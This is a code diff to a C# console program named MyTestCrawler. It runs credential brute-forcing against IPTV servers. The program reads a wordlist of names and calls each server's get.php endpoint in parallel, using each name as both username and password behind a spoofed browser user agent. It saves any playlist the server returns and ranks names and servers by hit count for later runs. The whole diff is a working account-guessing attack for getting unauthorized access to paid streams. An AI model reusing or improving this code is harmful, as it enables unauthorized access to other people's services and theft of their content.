@@ -13,7 +13,8 @@ namespace MyTestCrawler
 {
 	class Program
 	{
-		static List<string> names;
+		static string plus = ""; //"_plus";
+		static Dictionary<string, int> names;
 		static void Main(string[] args)
 		{
 			MainAsync(args).ConfigureAwait(false).GetAwaiter().GetResult();
@@ -25,73 +26,98 @@ namespace MyTestCrawler
 			await LoadNames();
 			Console.WriteLine("[DONE] -> trovati " + names.Count + " nomi");
 			Console.Write("Caricamento url... ");
-			var urls = await GetUrls();
-			Console.WriteLine("[DONE] -> trovati " + urls.Length + " url");
+			await LoadUrls();
+			Console.WriteLine("[DONE] -> trovati " + listaUrl.Count + " url");
 			Console.WriteLine("Inizio brute force...");
-			ForcingUrls(urls);
+			ForcingUrls();
 			Console.WriteLine("[DONE]");
 		}
 		static CancellationToken ct = new CancellationToken();
-		private static void ForcingUrls(string[] urls)
+		private static void ForcingUrls()
 		{
-			Parallel.ForEach(urls, new ParallelOptions {
+			Parallel.ForEach(listaUrl, new ParallelOptions
+			{
 				CancellationToken = ct,
-				MaxDegreeOfParallelism = 4
-			} , (source, state, ix) => {
+				MaxDegreeOfParallelism = Environment.ProcessorCount + 1
+			}, (source, state, ix) =>
+			{
 				Console.WriteLine("   > " + source);
 				BruteForce(source, state, ix).Wait();
 				Console.WriteLine("   > " + source + " [DONE]");
 			});
 		}
 
-		static async Task LoadNames() {
-			var files = Directory.EnumerateFiles(Path.Combine(Environment.CurrentDirectory, "nomi"), "*.txt", SearchOption.TopDirectoryOnly);
-			var ListaNomi = new List<string>();
+		static async Task LoadNames()
+		{
+			var files = Directory.EnumerateFiles(Path.Combine(Environment.CurrentDirectory, "nomi"), "tutti.lista", SearchOption.TopDirectoryOnly);
+			var lst = new List<string>();
 			foreach (var item in files)
 			{
 				var nomi = await File.ReadAllLinesAsync(item);
-				ListaNomi = ListaNomi.Union(nomi).Distinct().ToList();
+				lst = lst.Union(nomi).Distinct().ToList();
 			}
-			await File.AppendAllLinesAsync(Path.Combine(Environment.CurrentDirectory, "nomi", "tutti.lista"), ListaNomi);
-			Random rnd = new Random();
-			names = ListaNomi.OrderBy(x => rnd.Next()).ToList();
+			var dic = lst.Select(s => s.Split('\t')).Select(f => new KeyValuePair<string, int>(f[0], int.Parse(f.Length > 1 ? f[1] : "0")));
+			names = dic.OrderByDescending(f => f.Value).ThenByDescending(f => f.Key).ToDictionary((f) => f.Key, (v) => v.Value);
 		}
 
-		static async Task BruteForce(string url, ParallelLoopState state, long index)
+		static async Task BruteForce(KeyValuePair<string, int> url, ParallelLoopState state, long index)
 		{
-			Uri urlInfo = new Uri(url);
+			Uri urlInfo = new Uri(url.Key);
 			var outDir = Path.Combine(Environment.CurrentDirectory, "out", urlInfo.Host);
-			if (!Directory.Exists(outDir)) Directory.CreateDirectory(outDir);
 			HttpClient client = new HttpClient();
 			client.DefaultRequestHeaders.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
-
+			var found = false;
 			foreach (var user in names)
 			{
-				var fileName = Path.Combine(outDir, user + ".m3u");
+				var fileName = Path.Combine(outDir, user.Key + ".m3u");
 				try
 				{
-					var req = await client.GetAsync($"{url}/get.php?username={user}&password={user}&type=m3u_plus&output=mpegts");
-					Console.WriteLine(("   > " + url + " user " + user).PadRight(80, ' ') + req.StatusCode);
+					var req = await client.GetAsync($"{url.Key}/get.php?username={user.Key}&password={user.Key}&type=m3u{plus}&output=mpegts");
+					Console.WriteLine(("   > " + url.Key + " user " + user.Key).PadRight(70, '.') + req.StatusCode);
 					if (req.StatusCode != System.Net.HttpStatusCode.OK)
+					{
 						break;
-					else {
+					}
+					else
+					{
 #if DEBUG
 						//Debugger.Break();
 #endif
 						var testo = await req.Content.ReadAsStringAsync();
 						if (!string.IsNullOrWhiteSpace(testo))
 						{
-							Console.WriteLine("   > " + url + " < trovata lista: " + fileName);
-							await File.AppendAllTextAsync(fileName, testo);
+							found = true;
+							if (!Directory.Exists(outDir)) Directory.CreateDirectory(outDir);
+							Console.WriteLine("   > " + url.Key + " < trovata lista: " + fileName);
+							names[user.Key] = user.Value + 1;
+							var newl = names.Select(s => $"{s.Key}\t{s.Value}").ToList();
+							await File.WriteAllTextAsync(fileName, testo);
+							await File.WriteAllLinesAsync(Path.Combine(Environment.CurrentDirectory, "nomi", "tutti.lista"), newl);
 						}
 					}
-				} catch(HttpRequestException ex) {
+				}
+				catch (HttpRequestException ex)
+				{
 				}
 			}
+			if (found)
+			{
+				listaUrl[url.Key] += 1;
+			}
+			else
+			{
+				listaUrl[url.Key] -= 1;
+			}
+
+			var newurl = listaUrl.Select(s => $"{s.Key}\t{s.Value}").ToList();
+			await File.WriteAllLinesAsync(Path.Combine(Environment.CurrentDirectory, "urls.txt"), newurl);
 
 		}
 
-		async static Task<string[]> GetUrls() {
+		static Dictionary<string, int> listaUrl;
+
+		async static Task LoadUrls()
+		{
 			var old = await File.ReadAllLinesAsync(Path.Combine(Environment.CurrentDirectory, "urls.txt"));
 			string[] urls = old.Select(f => f.TrimEnd('/')).ToArray();
 #if RELEASE
@@ -138,7 +164,11 @@ namespace MyTestCrawler
 			}
 #endif
 			await File.WriteAllLinesAsync(Path.Combine(Environment.CurrentDirectory, "urls.txt"), urls);
-			return urls;
+
+			listaUrl = urls.Distinct().Select(f => f.Split('\t'))
+				.ToDictionary((f) => f[0], f => int.Parse(f.Length > 1 ? f[1] : "0"))
+				.OrderByDescending(f => f.Value).ToDictionary((f) => f.Key, (v) => v.Value);
+
 		}
 	}
 }
